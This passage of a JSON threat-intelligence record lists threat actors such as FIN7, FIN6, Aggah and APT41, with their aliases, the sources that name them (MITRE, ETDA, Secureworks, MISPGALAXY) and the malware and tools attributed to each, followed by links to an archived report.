                "Carbanak",
                "Pillowmint",
                "Cobalt Strike",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRat",
                "Lizar",
                "TEXTMATE",
                "BOOSTWRITE"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b0d34dd6-ee90-483b-bb6c-441332274160",
            "created_at": "2022-10-25T16:07:23.296754Z",
            "updated_at": "2025-03-27T02:02:09.724313Z",
            "deleted_at": null,
            "main_name": "Aggah",
            "aliases": [
                "Operation Red Deer",
                "Operation Roma225"
            ],
            "source_name": "ETDA:Aggah",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "Aggah",
                "Atros2.CKPN",
                "Bladabindi",
                "Jorik",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "Negasteal",
                "Origin Logger",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "Warzone",
                "Warzone RAT",
                "ZPAQ",
                "Zurten",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b3acfb48-b04d-4d3d-88a8-836d7376fa2e",
            "created_at": "2024-06-19T02:03:08.052814Z",
            "updated_at": "2025-03-27T02:05:17.368029Z",
            "deleted_at": null,
            "main_name": "GOLD FRANKLIN",
            "aliases": [
                "ITG08 ",
                "MageCart Group 6 ",
                "Skeleton Spider ",
                "White Giant ",
                "FIN6 "
            ],
            "source_name": "Secureworks:GOLD FRANKLIN",
            "tools": [
                " Metasploit",
                " Meterpreter",
                " Mimikatz",
                " PowerSploit",
                " PowerUpSQL",
                " RemCom",
                "FrameWorkPOS"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ea7bfe06-7c23-481d-b8ba-eafa6cda3bc9",
            "created_at": "2022-10-25T15:50:23.317961Z",
            "updated_at": "2025-03-27T02:00:55.440858Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "FIN6",
                "Magecart Group 6",
                "ITG08",
                "Skeleton Spider",
                "TAAL",
                "Camouflage Tempest"
            ],
            "source_name": "MITRE:FIN6",
            "tools": [
                "FlawedAmmyy",
                "GrimAgent",
                "FrameworkPOS",
                "More_eggs",
                "Cobalt Strike",
                "Windows Credential Editor",
                "AdFind",
                "PsExec",
                "LockerGoga",
                "Ryuk",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d85adfe3-e1c3-40b0-b8bb-d1bacadc4d82",
            "created_at": "2022-10-25T16:07:23.619566Z",
            "updated_at": "2025-03-27T02:02:09.890982Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "APT-C-11",
                "ATK 32",
                "Gold Niagara",
                "ITG14",
                "TAG-CR1"
            ],
            "source_name": "ETDA:FIN7",
            "tools": [
                "7Logger",
                "Agentemis",
                "Anunak",
                "Astra",
                "BIOLOAD",
                "BIRDWATCH",
                "Bateleur",
                "Boostwrite",
                "CROWVIEW",
                "Carbanak",
                "Cobalt Strike",
                "CobaltStrike",
                "DICELOADER",
                "DNSMessenger",
                "FOWLGAZE",
                "HALFBAKED",
                "JSSLoader",
                "KillACK",
                "LOADOUT",
                "Lizar",
                "Meterpreter",
                "Mimikatz",
                "POWERPLANT",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "TEXTMATE",
                "Tirion",
                "VB Flash",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536041,
    "ts_updated_at": 1743041776,
    "ts_creation_date": 1653752622,
    "ts_modification_date": 1653752622,
    "files": {
        "pdf": "https://archive.orkl.eu/b0eeb4f27d695518aa8037b19e27cb6c6248f84f.pdf",
        "text": "https://archive.orkl.eu/b0eeb4f27d695518aa8037b19e27cb6c6248f84f.txt",
        "img": "https://archive.orkl.eu/b0eeb4f27d695518aa8037b19e27cb6c6248f84f.jpg"
    }
}